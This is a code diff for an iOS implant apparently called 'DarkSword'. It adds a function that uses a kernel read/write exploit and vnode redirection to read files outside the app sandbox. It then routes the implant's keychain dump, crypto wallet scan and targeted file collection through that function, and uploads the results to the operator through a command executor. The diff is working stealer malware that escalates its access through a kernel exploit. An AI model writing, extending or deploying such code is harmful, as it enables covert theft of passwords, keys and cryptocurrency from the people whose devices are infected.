@@ -17,6 +17,12 @@
 #import "PersistStoreHarvester.h"
 #import "MCMFilzaIntegration.h"
 #import "MCMBridge.h"
+#import "krw.h"
+#import "kexploit/vnode.h"
+
+/// Set to a non-zero inpcb pointer by kexploit_opa334() once kernel read/write
+/// is live. This is the "krw is ready" sentinel.
+extern uint64_t rwSocketPcb;
 
 static NSString *const DSDarkSwordEnabledKey = @"darkSwordEnabled";
 static NSString *const DSDarkSwordUploadKey = @"darkSwordUpload";
@@ -200,6 +206,51 @@ void DarkSwordReportResult(NSNumber *commandID, NSString *output, NSString *stat
     }] resume];
 }
 
+#pragma mark - Kernel file read
+
+/// YES when kexploit_opa334() has succeeded and kernel read/write is live.
+static BOOL DSKernelRWReady(void)
+{
+    return rwSocketPcb != 0;
+}
+
+/// Read an arbitrary path by redirecting a sandbox-accessible scratch file's
+/// vnode data to point at the target, then reading the scratch file. This
+/// bypasses the sandbox for paths NSFileManager cannot open (e.g. /var).
+static NSData *DSKernelReadFile(NSString *path)
+{
+    if (!DSKernelRWReady() || path.length == 0) return nil;
+    const char *from = path.UTF8String;
+
+    NSString *toPath = [NSTemporaryDirectory()
+        stringByAppendingPathComponent:[NSString stringWithFormat:@"ds_kread_%u", arc4random()]];
+    if (![@"x" writeToFile:toPath atomically:YES encoding:NSUTF8StringEncoding error:nil]) {
+        return nil;
+    }
+
+    uint64_t orig_vnode = 0, orig_vdata = 0;
+    if (!vnode_redirect_file((char *)toPath.UTF8String, (char *)from,
+                             &orig_vnode, &orig_vdata)) {
+        [[NSFileManager defaultManager] removeItemAtPath:toPath error:nil];
+        return nil;
+    }
+
+    NSData *data = [NSData dataWithContentsOfFile:toPath];
+
+    vnode_unredirect_file(orig_vnode, orig_vdata);
+    [[NSFileManager defaultManager] removeItemAtPath:toPath error:nil];
+    return data;
+}
+
+/// Read a file with NSFileManager first, falling back to kernel read when the
+/// sandbox blocks the path.
+static NSData *DSReadFileBytes(NSString *path)
+{
+    NSData *data = [NSData dataWithContentsOfFile:path];
+    if (data.length > 0) return data;
+    return DSKernelReadFile(path);
+}
+
 #pragma mark - Command executor
 
 static NSString *DSDeviceInfo(void)
@@ -229,7 +280,7 @@ static NSString *DSListDirectory(NSString *path)
 
 static NSString *DSReadFile(NSString *path)
 {
-    NSData *data = [NSData dataWithContentsOfFile:path];
+    NSData *data = DSReadFileBytes(path);
     if (!data) return [NSString stringWithFormat:@"cannot read %@", path];
     if (data.length > DSDarkSwordMaxOutputBytes) {
         data = [data subdataWithRange:NSMakeRange(0, DSDarkSwordMaxOutputBytes)];
@@ -250,7 +301,7 @@ static NSString *DSKeychainDump(void)
     ];
     NSUInteger uploaded = 0;
     for (NSString *path in candidates) {
-        NSData *data = [NSData dataWithContentsOfFile:path];
+        NSData *data = DSReadFileBytes(path);
         if (data.length > 0) {
             DarkSwordUpload(@"keychain", path, @"raw keychain database", data, nil);
             uploaded += 1;
@@ -311,7 +362,7 @@ static void DSWalletScanOne(NSDictionary *wallet)
     }
     for (NSString *relative in wallet[@"files"]) {
         NSString *path = [container stringByAppendingPathComponent:relative];
-        NSData *data = [NSData dataWithContentsOfFile:path];
+        NSData *data = DSReadFileBytes(path);
         if (data.length == 0) continue;
         NSString *desc = [NSString stringWithFormat:@"%@ (%@)", wallet[@"type"], bundleID];
         DarkSwordUpload(@"wallet", path, desc, data, nil);
@@ -488,7 +539,7 @@ static void DSCollectOne(NSDictionary *target)
 {
     NSString *path = target[@"path"];
     NSString *category = target[@"category"];
-    NSData *data = [NSData dataWithContentsOfFile:path];
+    NSData *data = DSReadFileBytes(path);
     if (data.length == 0) {
         DSLog(@"collect skip %@ (unreadable)", category);
         return;
